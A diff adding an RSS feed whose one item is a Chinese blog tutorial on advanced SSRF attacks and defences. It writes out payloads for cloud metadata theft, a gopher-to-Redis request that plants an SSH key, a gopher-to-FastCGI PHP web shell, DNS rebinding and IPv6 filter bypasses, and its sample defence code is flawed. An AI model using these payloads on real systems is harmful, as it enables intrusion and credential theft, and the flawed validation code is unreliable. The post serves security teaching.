@@ -1,0 +1,118 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SSRF on 言零的博客</title><link>https://blog.caowo.de/tags/ssrf/</link><description>Recent content in SSRF on 言零的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Sun, 01 Mar 2026 10:00:00 +0800</lastBuildDate><atom:link href="https://blog.caowo.de/tags/ssrf/index.xml" rel="self" type="application/rss+xml"/><item><title>高级 SSRF 技巧与防御 - 从内网探测到云环境接管</title><link>https://blog.caowo.de/posts/advanced-ssrf-techniques/</link><pubDate>Sun, 01 Mar 2026 10:00:00 +0800</pubDate><guid>https://blog.caowo.de/posts/advanced-ssrf-techniques/</guid><description>&lt;h1 id="高级-ssrf-技巧与防御---从内网探测到云环境接管"&gt;高级 SSRF 技巧与防御 - 从内网探测到云环境接管
+&lt;/h1&gt;&lt;h2 id="-漏洞概述"&gt;📋 漏洞概述
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;漏洞名称&lt;/strong&gt;: Server-Side Request Forgery (SSRF)&lt;br&gt;
+&lt;strong&gt;漏洞类型&lt;/strong&gt;: 服务端请求伪造&lt;br&gt;
+&lt;strong&gt;危害等级&lt;/strong&gt;: 🔴 高危&lt;br&gt;
+&lt;strong&gt;扩展场景&lt;/strong&gt;: 结合开放式重定向、DNS 重绑定等技术增强利用&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="-漏洞原理回顾"&gt;🎯 漏洞原理回顾
+&lt;/h2&gt;&lt;h3 id="ssrf-基础原理"&gt;SSRF 基础原理
+&lt;/h3&gt;&lt;p&gt;SSRF（服务端请求伪造）是一种允许攻击者诱导服务器发起非预期请求的漏洞。攻击者可以：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;探测内网结构与拓扑&lt;/li&gt;
+&lt;li&gt;访问内网服务、设备管理接口&lt;/li&gt;
+&lt;li&gt;窃取云环境元数据&lt;/li&gt;
+&lt;li&gt;绕过防火墙和网络限制&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="高级利用"&gt;高级利用
+&lt;/h3&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;攻击者 → Web 应用 → 内网服务/云 API
+ (被利用)
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h2 id="-环境搭建"&gt;🧪 环境搭建
+&lt;/h2&gt;&lt;h3 id="强化目标测试环境"&gt;强化目标测试环境
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;选择复杂网络场景：存在多网卡、复杂路由表、VPN&lt;/li&gt;
+&lt;li&gt;利用流量分析工具辅助判断（WireShark、tcpdump）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="常见弱点位置"&gt;常见弱点位置
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;开放式重定向&lt;/strong&gt;: &lt;code&gt;GET /redirect?target=http://internal/api&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;代理回调接口&lt;/strong&gt;: &lt;code&gt;POST /proxy {&amp;quot;url&amp;quot;: &amp;quot;http://...&amp;quot;}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;突破网络边界&lt;/strong&gt;: &lt;code&gt;GET /fetch?url=http://internal:8080/sensitive&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id="-漏洞利用策略"&gt;⚔️ 漏洞利用策略
+&lt;/h2&gt;&lt;h3 id="1-云环境元数据窃取"&gt;1️⃣ 云环境元数据窃取
+&lt;/h3&gt;&lt;h4 id="aliyun"&gt;Aliyun
+&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-http" data-lang="http"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/fetch?url=http://100.100.100.200/latest/meta-data/&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;敏感路径:&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;/latest/meta-data/instance-id
+/latest/meta-data/network/interfaces/macs/
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id="aws"&gt;AWS
+&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-http" data-lang="http"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/fetch?url=http://169.254.169.254/latest/meta-data/&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="tencent-cloud"&gt;Tencent Cloud
+&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-http" data-lang="http"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/fetch?url=http://metadata.tencentyun.com/latest/meta-data/&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="2-混合协议利用"&gt;2️⃣ 混合协议利用
+&lt;/h3&gt;&lt;h4 id="gopher--redis"&gt;Gopher + Redis
+&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-http" data-lang="http"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/fetch?url=gopher://127.0.0.1:6379/_INFO&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="攻击者写入-ssh-公钥"&gt;攻击者写入 SSH 公钥
+&lt;/h4&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;gopher://127.0.0.1:6379/_CONFIG SET dir /root/.ssh/_CONFIG SET dbfilename authorized_keys/_SET mykey &amp;#34;ssh-rsa AAAA...&amp;#34;/_SAVE
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id="fastcgi-远程调用"&gt;FastCGI 远程调用
+&lt;/h4&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;gopher://127.0.0.1:9000/_fcgi?request_method=POST&amp;amp;content_type=application/x-www-form-urlencoded&amp;amp;content_length=38&amp;amp;body=&amp;lt;?php system($_GET[1]);?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="3-dns-重绑定攻击"&gt;3️⃣ DNS 重绑定攻击
+&lt;/h3&gt;&lt;p&gt;当目标过滤 IP 时，使用 DNS 重绑定绕过：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;注册域名 &lt;code&gt;attacker.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;首次解析为公网 IP（通过过滤）&lt;/li&gt;
+&lt;li&gt;二次解析为内网 IP（实际请求）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;工具&lt;/strong&gt;: &lt;a class="link" href="https://github.com/nccgroup/rbndr" target="_blank" rel="noopener"
+ &gt;rbndr&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id="4-ipv6-探测"&gt;4️⃣ IPv6 探测
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-http" data-lang="http"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/fetch?url=http://[::1]:8080/admin&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;GET&lt;/span&gt; &lt;span class="l"&gt;/fetch?url=https://[0:0:0:0:0:ffff:7f00:1]:8080/api HTTP/1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id="-高危防御方案"&gt;🛡️ 高危防御方案
+&lt;/h2&gt;&lt;h3 id="1-ip-地址验证"&gt;1. IP 地址验证
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;白名单&lt;/strong&gt;：
+确保只允许访问特定 IP&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;ipaddress&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;allowed_ipv4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;123.45.67.89&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;98.76.54.32&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;allowed_ipv6&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;2001:0db8:85a3::8a2e:0370:7334&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;is_safe_ip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;allowed_ipv4&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;tuple&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;addr&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;addr&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;allowed_ipv6&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="2-安全扫描"&gt;2. 安全扫描
+&lt;/h3&gt;&lt;p&gt;使用工具&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Burp Suite Collaborator&lt;/li&gt;
+&lt;li&gt;Nmap 脚本引擎&lt;/li&gt;
+&lt;li&gt;Nuclei&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="3-网络隔离"&gt;3. 网络隔离
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;VLAN 划分&lt;/li&gt;
+&lt;li&gt;DMZ
+e.g.:
+使用防火墙规则限制跨网段访问&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="4-过滤偏离协议内容"&gt;4. 过滤偏离协议内容
+&lt;/h3&gt;&lt;p&gt;阻止 gopher 或 ftp 指定协议访问&lt;/p&gt;
+&lt;h4 id="示例代码"&gt;示例代码
+&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;ALLOWED_PROTOCOLS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;https&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;validate_protocol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;parsed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urlparse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;parsed&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;scheme&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;ALLOWED_PROTOCOLS&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;ValueError&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Disallowed scheme detected!&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id="-产业案例与防御建议"&gt;🎯 产业案例与防御建议
+&lt;/h2&gt;&lt;h3 id="真实案例分析"&gt;真实案例分析
+&lt;/h3&gt;&lt;h4 id="某电商平台"&gt;某电商平台
+&lt;/h4&gt;&lt;p&gt;强调内部帐户系统和货品管理端口的安全性&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞点&lt;/strong&gt;: 内部 API 泄露
+&lt;strong&gt;利用链&lt;/strong&gt;: SSRF + DNS Rebinding 引导外部流量至内部接口
+&lt;strong&gt;影响&lt;/strong&gt;: 内部系统数据泄漏与资金窃取&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="-学习资源"&gt;🎓 学习资源
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class="link" href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener"
+ &gt;OWASP SSRF Prevention Cheat Sheet&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class="link" href="https://github.com/nccgroup/rbndr" target="_blank" rel="noopener"
+ &gt;NCC Group Rebinding Tool (rbndr)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class="link" href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener"
+ &gt;PortSwigger SSRF Labs&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;标签&lt;/strong&gt;: #SSRF #Web 安全 #漏洞复现 #SRC #云安全&lt;/p&gt;</description></item></channel></rss>
